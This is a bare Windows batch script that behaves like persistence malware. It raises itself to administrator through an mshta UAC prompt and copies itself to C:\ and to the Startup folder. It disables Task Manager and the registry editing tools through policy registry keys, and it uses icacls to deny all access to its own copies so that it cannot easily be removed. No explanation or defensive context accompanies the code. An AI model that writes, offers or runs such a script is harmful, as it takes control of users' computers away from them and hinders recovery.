@echo off
cls

:: Check for admin rights
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Requesting Administrator privileges...
    goto UACPrompt
)

:UACPrompt
if '%1'=='RightClick' goto SkipUAC
mshta vbscript:createobject("shell.application").shellexecute("%~s0","RightClick","","runas",1)(window.close)
exit /b

:SkipUAC

:: Variables
set "source=%~f0"
set "filename=%~nx0"

:: Copy to C:\
copy /y "%source%" "C:\%filename%" >nul

:: Copy to Startup
copy /y "%source%" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\%filename%" >nul

:: Disable Task Manager
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f >nul

:: Optional: Remove permissions on the Registry key to prevent easy removal
icacls "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\%filename%" /deny Everyone:F >nul 2>&1
icacls "C:\%filename%" /deny Everyone:F >nul 2>&1

:: Make registry key inaccessible
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies" /v "NoRegistryTools" /t REG_DWORD /d 1 /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d 1 /f >nul

echo.
pause >nul
exit
